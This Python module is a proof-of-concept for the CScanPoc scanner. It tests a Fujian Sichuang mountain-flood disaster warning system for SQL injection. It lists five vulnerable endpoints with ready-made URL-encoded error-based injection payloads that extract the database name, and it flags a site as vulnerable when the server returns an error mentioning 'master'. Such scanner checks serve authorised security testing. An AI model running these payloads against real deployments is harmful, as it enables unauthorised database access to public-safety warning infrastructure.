# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'StrongSoft_0014'  # 平台漏洞编号，留空
    name = '四创灾害预警系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-04 '  # 漏洞公布时间
    desc = '''
        福建四创软件开发的“山洪灾害预警监测系统”存在SQL注入漏洞，可获取数据库任意数据，进而而导致预警系统沦陷。
        /MapInfoShow/InfoMain.aspx
        /MapInfoShow/InfoDetail.aspx
        /public/DataAccess/GeneralModule/GetFeatureInfo.ashx
        /public/DataAccess/GeneralModule/doDbAccess.ashx
        /SystemManage/Plan/GetArea.ashx
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=099084'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '四创灾害预警系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ba85b397-308c-408a-b0b3-2a6d084f3f80'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-099088
            # refer:http://www.wooyun.org/bugs/wooyun-2010-099084
            # refer:http://www.wooyun.org/bugs/wooyun-2010-099077
            # refer:http://www.wooyun.org/bugs/wooyun-2010-099074
            # refer:http://www.wooyun.org/bugs/wooyun-2010-097446
            # refer:http://www.wooyun.org/bugs/wooyun-2010-097445
            # refer:http://www.wooyun.org/bugs/wooyun-2010-095953
            # refer:http://www.wooyun.org/bugs/wooyun-2010-094994
            # refer:http://www.wooyun.org/bugs/wooyun-2010-094226
            hh = hackhttp.hackhttp()
            payloads = {
                '/MapInfoShow/InfoMain.aspx?menuUrl=InfoMenuReservoir.aspx&ADCD=rs046': '%27%2b%28SELECT%20%27VcEO%27%20WHERE%203750%3D3750%20AND%203455%3Ddb_name%281%29%29%2b%27',
                '/MapInfoShow/InfoDetail.aspx?keycol=RSCD&tabnm=StrongWater.dbo.RS_Info_B&ADCD=rs054': '%27%2b%28SELECT%20%27VcEO%27%20WHERE%203750%3D3750%20AND%203455%3Ddb_name%281%29%29%2b%27',
                '/public/DataAccess/GeneralModule/GetFeatureInfo.ashx?SqlKey=Map_S_GetReseFeatureInfo_ZWP&STCD=rs048': '%27%20and%201%3Ddb_name%281%29--',
                '/public/DataAccess/GeneralModule/doDbAccess.ashx?sqlkey=Map_S_GetReseData_ZWP¶ms=%274%27': '%29%20%20and%20%281%20%3Ddb_name%281%29',
                '/SystemManage/Plan/GetArea.ashx?sqlkey=Map_S_GetSubAreaByPID_PX&pid=1': '%27%2b%28SELECT%20%27InPV%27%20WHERE%207481%3D7481%20AND%201135%3DCONVERT%28INT%2Cdb_name%281%29%29%29%2b%27'
            }
            for payload in payloads:
                url = self.target + payload + payloads[payload]
                code, head, res, errcode, _ = hh.http(url)
                if code == 500 and 'master' in res:
                    #security_hole(arg + payload + "   :sql Injection")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
